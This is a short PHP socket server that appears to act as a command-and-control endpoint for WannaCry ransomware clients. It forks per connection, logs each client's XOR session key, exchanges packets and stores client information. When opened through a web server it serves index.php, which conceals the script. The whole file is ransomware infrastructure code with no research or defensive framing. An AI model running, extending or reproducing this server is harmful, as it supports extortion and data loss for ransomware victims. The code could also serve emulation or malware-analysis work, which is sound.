<?php
	
	if(!empty($_SERVER["REQUEST_METHOD"]))
	{
		die(file_get_contents("index.php"));
	}
	
	if(!extension_loaded("sockets"))
	{
		die("Sockets arent enabled, dumbass.\n");
	}
	
	if(!extension_loaded("pcntl"))
	{
		die("PCNTL is not enabled, dumbass.\n");
	}
	
	require("include/libs/sock/SocketServer.php");
	require_once("include/packet.php");

	if(!is_dir(USERINF_DATABASE))
	{
		mkdir(USERINF_DATABASE, 0777);
	}
	
	get_currency();
	
	function onConnect($client)
	{
		$pid = pcntl_fork();
		if ($pid == -1)
		{
			 die("could not forkie");
		}
		else if($pid)
		{
			// parent process
			return;
		}
		
		printf("WannaCry connected!\n");
		
		$read = $client->read(240);
		if(!empty($read))
		{
			$xor_key = parse_key_packet($read);
			if($xor_key !== null)
			{
				printf("Session key: [%s]\n", strtoupper(bin2hex($xor_key)));
				
				$entropy_response = openssl_random_pseudo_bytes(rand(31, 231), $cstrong);
				$ok_continue = make_packet($entropy_response, "\x02", $xor_key);
				$client->send($ok_continue);
				
				$read = $client->read();
				if(!empty($read))
				{
					$final_respond = parse_info_packet($read, $xor_key);
					if($final_respond !== null)
					{
						$client->send($final_respond);
					}
				}
			}
		}
		
		$client->close();
		printf("\n\n");
		exit(0);
	}

	$server = new \Sock\SocketServer(BIND_RUN_PORT);
	$server->init();
	$server->setConnectionHandler('onConnect');
	$server->listen();

?>